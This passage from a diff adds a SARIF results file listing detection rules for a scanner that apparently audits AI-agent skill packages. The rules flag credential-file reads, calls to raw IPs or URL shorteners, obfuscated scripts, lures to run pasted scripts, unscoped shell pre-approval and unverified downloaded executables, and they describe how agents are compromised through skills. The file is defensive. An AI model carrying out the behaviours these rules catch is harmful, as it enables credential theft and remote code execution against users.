+                "text": "Hard-coded credential in the package"
+              }
+            },
+            {
+              "defaultConfiguration": {
+                "level": "warning"
+              },
+              "helpUri": "https://github.com/spellwarden-ai/spellwarden#the-rules",
+              "id": "SW-SKL-012",
+              "name": "ReadsACredentialFilePathWithoutStatingPurpose",
+              "properties": {
+                "security-severity": "5.5",
+                "tags": [
+                  "security",
+                  "ASI04",
+                  "IA-5",
+                  "AML.T0098"
+                ]
+              },
+              "shortDescription": {
+                "text": "Reads a credential file path without stating purpose"
+              }
+            },
+            {
+              "defaultConfiguration": {
+                "level": "warning"
+              },
+              "helpUri": "https://github.com/spellwarden-ai/spellwarden#the-rules",
+              "id": "SW-SKL-013",
+              "name": "NetworkCallsToRawIPAddressesOrURLShorteners",
+              "properties": {
+                "security-severity": "5.5",
+                "tags": [
+                  "security",
+                  "ASI10",
+                  "SC-7",
+                  "AML.T0025"
+                ]
+              },
+              "shortDescription": {
+                "text": "Network calls to raw IP addresses or URL shorteners"
+              }
+            },
+            {
+              "defaultConfiguration": {
+                "level": "warning"
+              },
+              "helpUri": "https://github.com/spellwarden-ai/spellwarden#the-rules",
+              "id": "SW-SKL-014",
+              "name": "ObfuscatedScriptCode",
+              "properties": {
+                "security-severity": "5.5",
+                "tags": [
+                  "security",
+                  "ASI04",
+                  "SR-3",
+                  "AML.T0011.001"
+                ]
+              },
+              "shortDescription": {
+                "text": "Obfuscated script code"
+              }
+            },
+            {
+              "defaultConfiguration": {
+                "level": "note"
+              },
+              "helpUri": "https://github.com/spellwarden-ai/spellwarden#the-rules",
+              "id": "SW-SKL-015",
+              "name": "FrontmatterMissingOrInvalidNameDescription",
+              "properties": {
+                "security-severity": "3.0",
+                "tags": [
+                  "security",
+                  "ASI04",
+                  "SR-3",
+                  "AST04"
+                ]
+              },
+              "shortDescription": {
+                "text": "Frontmatter missing or invalid (name, description)"
+              }
+            },
+            {
+              "defaultConfiguration": {
+                "level": "warning"
+              },
+              "helpUri": "https://github.com/spellwarden-ai/spellwarden#the-rules",
+              "id": "SW-SKL-019",
+              "name": "FetchesExternalURLContentIntoContextWithoutAnAllowlist",
+              "properties": {
+                "security-severity": "5.5",
+                "tags": [
+                  "security",
+                  "ASI01",
+                  "MCP06",
+                  "SI-10",
+                  "AML.T0051.001",
+                  "AST05"
+                ]
+              },
+              "shortDescription": {
+                "text": "Fetches external URL content into context without an allowlist"
+              }
+            },
+            {
+              "defaultConfiguration": {
+                "level": "note"
+              },
+              "helpUri": "https://github.com/spellwarden-ai/spellwarden#the-rules",
+              "id": "SW-SKL-031",
+              "name": "MissingLicenseAndVersionMetadata",
+              "properties": {
+                "security-severity": "3.0",
+                "tags": [
+                  "security",
+                  "ASI04",
+                  "SR-3",
+                  "AST04"
+                ]
+              },
+              "shortDescription": {
+                "text": "Missing license and version metadata"
+              }
+            },
+            {
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "helpUri": "https://github.com/spellwarden-ai/spellwarden#the-rules",
+              "id": "SW-SKL-032",
+              "name": "InstructionsLureTheUserIntoRunningAPasswordProtectedDownloadOrAPastedScript",
+              "properties": {
+                "security-severity": "9.5",
+                "tags": [
+                  "security",
+                  "ASI04",
+                  "ASI09",
+                  "SR-3",
+                  "SI-3",
+                  "AML.T0011",
+                  "AST01"
+                ]
+              },
+              "shortDescription": {
+                "text": "Instructions lure the user into running a password-protected download or a pasted script"
+              }
+            },
+            {
+              "defaultConfiguration": {
+                "level": "warning"
+              },
+              "helpUri": "https://github.com/spellwarden-ai/spellwarden#the-rules",
+              "id": "SW-SKL-036",
+              "name": "FrontmatterPreApprovesAnUnscopedShellOrInterpreter",
+              "properties": {
+                "security-severity": "5.5",
+                "tags": [
+                  "security",
+                  "ASI02",
+                  "ASI03",
+                  "AC-6",
+                  "CM-7",
+                  "AML.T0053",
+                  "AST03"
+                ]
+              },
+              "shortDescription": {
+                "text": "Frontmatter pre-approves an unscoped shell or interpreter"
+              }
+            },
+            {
+              "defaultConfiguration": {
+                "level": "warning"
+              },
+              "helpUri": "https://github.com/spellwarden-ai/spellwarden#the-rules",
+              "id": "SW-SKL-037",
+              "name": "ExecutableDownloadedFromAMovingReferenceAndRunWithoutAnIntegrityCheck",
+              "properties": {
+                "security-severity": "5.5",
+                "tags": [
+                  "security",
+                  "ASI04",
+                  "ASI05",
+                  "MCP04",
+                  "SR-3",
+                  "SI-7",
+                  "AML.T0010.005",
+                  "AML.T0109",
+                  "AST02",
+                  "AST07"
+                ]
+              },
+              "shortDescription": {
+                "text": "Executable downloaded from a moving reference and run without an integrity check"
+              }
+            }
+          ],
+          "semanticVersion": "1.13.0"
+        }
+      }
+    }
+  ],
+  "version": "2.1.0"
+}
